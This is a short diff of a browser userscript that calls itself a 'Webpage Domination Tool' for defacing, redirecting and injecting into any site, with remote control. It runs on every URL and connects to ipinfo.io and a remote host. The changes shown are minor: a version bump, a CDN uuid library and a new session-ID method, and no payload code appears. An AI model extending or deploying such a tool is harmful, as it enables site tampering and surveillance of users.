@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name Noodles - Webpage Domination Tool
 // @namespace http://noodles.local/
-// @version 1.337.74
-// @description Own any webpage. Deface, redirect, inject. Includes advanced configuration panel and remote control capabilities.
+// @version 1.337.75
+// @description Own any webpage. Deface, redirect, inject. Includes advanced configuration panel and remote control capabilities.  Use Responsibly.
 // @author TheBlackHatNoRemorse | Edited By Noodles Automatic - Enhanced by yours truly
 // @match *://*/*
 // @grant GM_setValue
@@ -15,6 +15,7 @@
 // @run-at document-start
 // @connect ipinfo.io
 // @connect noodles.local
+// @require https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuidv4.min.js
 // ==/UserScript==
 
 (function() {
@@ -28,7 +29,7 @@
     let sessionID = GM_getValue(storageKeyPrefix + 'sessionID', null);
 
     if (!sessionID) {
-        sessionID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        sessionID = uuidv4();
         GM_setValue(storageKeyPrefix + 'sessionID', sessionID);
     }
 
